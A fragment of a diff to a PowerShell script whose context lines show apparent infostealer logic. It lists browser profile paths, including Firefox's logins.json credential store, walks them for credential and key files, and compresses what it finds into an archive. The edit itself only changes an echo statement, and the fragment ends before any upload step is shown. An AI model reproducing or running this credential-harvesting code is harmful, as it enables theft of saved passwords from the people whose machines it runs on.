@@ -20,7 +20,8 @@ $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.jso
 
 for ($i=0; $i -lt 5; $i++){
   if(Test-Path -Path $lst[$i][0]){
-    echo ('______{0}' -f $lst[$i][0])
+    echo ' '
+    echo ($lst[$i][0])
     #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
     if("WinRAR"-in $arh){
       Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
